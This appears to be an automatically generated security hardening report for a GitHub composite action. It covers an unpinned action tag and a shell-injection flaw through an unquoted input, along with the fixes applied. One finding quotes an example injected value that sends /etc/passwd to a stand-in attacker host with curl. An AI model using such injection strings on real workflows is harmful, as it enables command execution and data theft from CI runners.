<!-- markdownlint-disable -->

# Hardening Report: dfreilich--pack-action/v2.0.13

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **dfreilich--pack-action/v2.0.13** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The composite action step 'install' references `buildpacks/github-actions/setup-pack@v4.1.0`, which is pinned to a mutable version tag rather than an immutable 40-character commit SHA. If the tag is moved (intentionally or via a supply-chain attack), a different — potentially malicious — version of the action could be executed. Pin to a full SHA, e.g. `buildpacks/github-actions/setup-pack@<40-char-sha> # v4.1.0`.

Locations:

- `action.yml:22`

### script-injection (severity: high)

Sub-rule (a): The `run-pack` step directly interpolates the user-controlled expression `${{ inputs.args }}` inside a `run:` shell command: `pack ${{ inputs.args }}`. Because GitHub Actions performs template substitution before the shell ever sees the string, an attacker can supply a value such as `; curl -d @/etc/passwd https://evil.example` to execute arbitrary shell commands. The fix is to pass the value through an env var and double-quote it: set `env: PACK_ARGS: ${{ inputs.args }}` and use `pack "$PACK_ARGS"` in the run block.

Locations:

- `action.yml:34`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:34`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

1. Pinned buildpacks/github-actions/setup-pack@v4.1.0 to full SHA b3038dd2ada5d9ce26d9bdd0c4f81473297e4379 with tag preserved as comment. 2. Fixed script injection on inputs.args by moving it to an env var (PACK_ARGS) and using xargs-based quote-aware tokenization into a bash array, then expanding with "${args[@]}" — this correctly handles multi-argument inputs like 'build myapp --builder heroku/buildpacks:20' while preventing shell injection.

